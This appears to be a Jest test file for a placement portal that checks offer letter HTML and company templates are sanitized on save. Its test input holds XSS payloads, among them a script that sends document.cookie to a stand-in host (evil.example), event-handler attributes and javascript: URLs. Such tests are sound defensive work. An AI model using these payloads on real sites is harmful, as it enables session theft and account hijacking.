const request = require("supertest");
const { app } = require("../app");
const Application = require("../models/application");
const Company = require("../models/company");
const {
  connectTestDb,
  clearTestDb,
  dropTestDb,
  bearer,
  createStudent,
  createCompany,
  createJob,
  createApplication,
} = require("./helpers");

beforeAll(connectTestDb);
afterEach(clearTestDb);
afterAll(dropTestDb);

const MALICIOUS =
  '<h2>OFFER LETTER</h2><p onclick="steal()">Dear <strong>Asha</strong>,</p>' +
  "<script>fetch('https://evil.example/'+document.cookie)</script>" +
  '<img src=x onerror="alert(1)"><iframe src="https://evil.example"></iframe>' +
  '<a href="javascript:alert(1)">click</a><a href="https://geetauniversity.edu.in">site</a>' +
  '<p style="background:url(javascript:alert(1))">CTC: 12 LPA</p>';

const assertSanitized = (html) => {
  expect(html).toContain("<h2>OFFER LETTER</h2>");
  expect(html).toContain("<strong>Asha</strong>");
  expect(html).toContain("CTC: 12 LPA");
  expect(html).toContain('href="https://geetauniversity.edu.in"');
  expect(html).not.toMatch(/<script/i);
  expect(html).not.toMatch(/<iframe/i);
  expect(html).not.toMatch(/<img/i);
  expect(html).not.toMatch(/onerror|onclick/i);
  expect(html).not.toMatch(/javascript:/i);
  expect(html).not.toMatch(/style=/i);
};

test("issue-offer stores sanitized offer letter HTML", async () => {
  const { user, company } = await createCompany();
  const job = await createJob(company);
  const { student } = await createStudent();
  const application = await createApplication(student, job);

  const res = await request(app)
    .put(`/api/applications/${application._id}/issue-offer`)
    .set(bearer(user))
    .send({ offerLetterContent: MALICIOUS });

  expect(res.status).toBe(200);
  const saved = await Application.findById(application._id);
  expect(saved.offerLetterStatus).toBe("Pending Approval");
  assertSanitized(saved.offerLetterContent);
});

test("offer letter template is sanitized on save", async () => {
  const { user, company } = await createCompany();
  const res = await request(app).put("/api/company/offer-template").set(bearer(user)).send({ offerLetterTemplate: MALICIOUS });
  expect(res.status).toBe(200);
  assertSanitized((await Company.findById(company._id)).offerLetterTemplate);
});
